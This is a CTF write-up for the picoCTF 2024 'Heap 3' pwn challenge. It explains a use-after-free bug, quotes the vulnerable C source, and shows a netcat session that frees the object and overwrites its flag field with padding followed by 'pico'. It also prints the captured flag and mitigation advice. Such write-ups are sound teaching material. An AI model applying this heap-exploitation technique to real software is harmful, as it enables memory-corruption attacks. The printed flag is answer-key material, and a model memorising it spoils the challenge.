## CTF: picoCTF 2024

Challenge: Heap 3

Category: pwn

Points: 10

Difficulty: Intermediate

## Instructions

This program mishandles memory. Can you exploit it to get the flag?

## Solution

This challenge abuses a use after vulnerability. It is important to understand what a use after free vulnerability is.

### Use After Free

The product reuses or references memory after it has been freed. At some point afterward, the memory may be allocated again and saved in another pointer, while the original pointer references a location somewhere within the new allocation. Any operations using the original pointer are no longer valid because the memory "belongs" to the code that operates on the new pointer. - CWE ([https://cwe.mitre.org/data/definitions/416.html](https://cwe.mitre.org/data/definitions/416.html))

Lets look at the source code to see if we can find this vulnerability in it.

```bash
int num_allocs;
object *x;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}
```

```bash
void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_memory() {
    free(x);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x->flag, x->flag);
    printf("+-------------+-----------+\n");
    fflush(stdout);
}
```

We see that it is checking if x->flag is equal to pico. We also see that **free_memory** does free the x object, but all the other functions still reference it. This means if we free x, we can then write whatever we want into it, and then call the check for win function. We also know that we need 30 bytes to start overwriting x->flag, because we need to get pass the first couple of variables in x.

```bash
// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;
```

With that, we now have everything we need for a full exploit.

### Exploit

```bash
amichel2579-academy@webshell:~/heap3$ nc chatelaine.cylabacademy.net 13073

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 5

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 35
Data for flag: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 4
Data for flag: ss

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 4
YOU WIN!!11!!
academy{now_thats_free_real_estate_95cc82ff}
```

## Flag

```bash
academy{now_thats_free_real_estate_95cc82ff}
```

## Mitigation

Make sure to NULL and zero memory after using it. You can also track object malloc and frees to ensure everything lines up. If not, don't keep running the program.